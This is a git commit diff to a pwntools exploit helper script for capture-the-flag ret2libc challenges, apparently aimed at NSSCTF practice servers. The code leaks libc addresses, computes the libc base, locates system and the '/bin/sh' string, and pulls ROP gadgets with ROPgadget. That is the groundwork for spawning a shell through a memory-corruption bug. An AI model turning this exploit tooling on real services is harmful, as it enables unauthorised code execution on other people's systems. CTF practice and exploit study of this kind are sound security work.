6e00587d6b6f5cfaa8bea97a949ffd3c1df62d43
himobrine <153483477+himobrine@users.noreply.github.com>
2024-08-24 14:36:32 +0800

    main.py

--- main.py
+++ main.py
@@ -2,9 +2,9 @@ from pwn import *
 from LibcSearcher import *
 import os
 
-dir = 'node5.anna.nssctf.cn:21747'
-file = './ret2libc'
-libc_target = ''
+dir = 'node4.anna.nssctf.cn:28561'
+file = './pwn'
+libc_target = './libc-2.23.so'
 host,port = dir.split(':')
 
 elf_state = True
@@ -14,6 +14,7 @@ shell = 'chmod +x '+ libc_target
 
 try:
     p = remote(host,port)
+    p.close()
 except:
     ps_state = False
 
@@ -36,11 +37,11 @@ except:
 
 def answer(name, data = None, item = None):
     type_data = isinstance(data,str)
-    if name == 'offest':
+    if name == 'offest' or name == 'padding':
         if item is None:
-            success(name + ': ' + hex(data))
+            success(name + ': ' + hex(data) + '=' + str(data))
         else:
-            success(name + ': ' + hex(data) + '\t(' + item + ')')
+            success(name + ': ' + hex(data) + '=' + str(data) + '\t(' + item + ')')
     elif name == 'success':
         success(name)
     elif name == 'done':
@@ -74,21 +75,42 @@ def data_recv_text():
 
 def data_recv(name,type = None):
     #only ret2libc
-    data = u64(p.recvuntil(b'\x7f')[1:].ljust(8,b'\x00'))
+    data = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
     answer(name,data)
     return data
 
-def libc_compute(name,name_add):
+def libc_compute(name,name_add,mode = None):
     #only ret2libc
-    libc = LibcSearcher(name,name_add)
-    libc_base = name_add - libc.dump(name)
     global system_add
     global binsh_add
-    binsh_add = libc_base + libc.dump('str_bin_sh')
-    system_add = libc_base + libc.dump('system')
+    if libc_state == False or mode != 'local':
+        libc = LibcSearcher(name,name_add)
+        libc_base = name_add - libc.dump(name)
+        binsh_add = libc_base + libc.dump('str_bin_sh')
+        system_add = libc_base + libc.dump('system')
+    else:
+        libc = ELF(libc_target)
+        libc_base = name_add - libc.sym[name]
+        system_add = libc_base + libc.sym['system']
+        binsh_add = libc_base + get_binsh_offest()
     answer('libc_base',libc_base)
     answer('system_add',system_add)
     answer('binsh_add',binsh_add)
+
+def get_binsh_offest():
+    shell = 'xxd ' + libc_target + ' |grep "2f 6269 6e2f 7368 00"'
+    data = os.popen(shell).readlines()[0].strip(' ')
+    libc_base,data= data.split(':')
+    libc_base = int(libc_base,16)
+    data = data[1:data.rindex(' ')]
+    out = ''
+    for i in data.split(' '):
+        i = i[:2] + ' ' + i[-2:] + ' '
+        out += i
+    offest = out.index('2f 62 69 6e 2f 73 68 00')//3
+    offest = offest + libc_base
+    answer('offest',offest)
+    return offest
 
 answer('elf_state',elf_state)
 answer('libc_state',libc_state)
@@ -100,12 +122,14 @@ else:
     p = process(file)
 
 answer('done')
+if elf_state == True:
+    shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"'
+    shell_rdi = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep rdi'
+    shell_ret = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep ": ret"'
+    rdi = int(os.popen(shell_rdi).readlines()[0][2:19],16)
+    ret = int(os.popen(shell_ret).readlines()[0][2:19],16)
 
-shell_rdi = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep rdi'
-shell_ret = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep ": ret"'
-rdi = int(os.popen(shell_rdi).readlines()[0][2:19],16)
-ret = int(os.popen(shell_ret).readlines()[0][2:19],16)
-
-answer('rdi',rdi)
-answer('ret',ret)
+    answer('rdi',rdi)
+    answer('ret',ret)
+    os.system(shell)
 context(os='linux', arch='amd64',log_level = 'debug')
